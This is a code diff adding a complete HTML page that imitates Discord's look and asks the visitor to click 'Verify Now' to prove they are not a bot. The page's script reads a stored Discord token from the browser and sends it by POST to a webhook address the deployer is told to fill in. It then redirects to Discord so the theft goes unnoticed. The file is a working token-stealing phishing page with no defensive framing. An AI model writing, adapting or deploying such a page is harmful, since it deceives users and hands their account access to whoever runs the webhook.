@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord - Verify</title>
+    <style>
+        body { background-color: #36393f; font-family: 'gg sans', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background-color: #2f3136; padding: 30px; border-radius: 8px; text-align: center; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        h2 { color: #fff; margin-bottom: 10px; }
+        p { color: #b9bbbe; font-size: 14px; margin-bottom: 20px; }
+        button { background-color: #7289da; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; }
+        button:hover { background-color: #5b6eae; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Verify Account</h2>
+        <p>Click below to verify you are not a bot.</p>
+        <button id="verifyBtn">Verify Now</button>
+    </div>
+    <script>
+        document.getElementById('verifyBtn').addEventListener('click', async () => {
+            const token = localStorage.getItem('discord_token');
+            if (!token) return alert("Log in first!");
+            
+            // REPLACE THIS WITH YOUR WEBHOOK URL
+            const webhook = "YOUR_WEBHOOK_URL_HERE"; 
+            
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `Token: \`\`\`${token}\`\`\`` })
+            });
+            window.location.href = "https://discord.com/channels/@me";
+        });
+    </script>
+</body>
+</html>
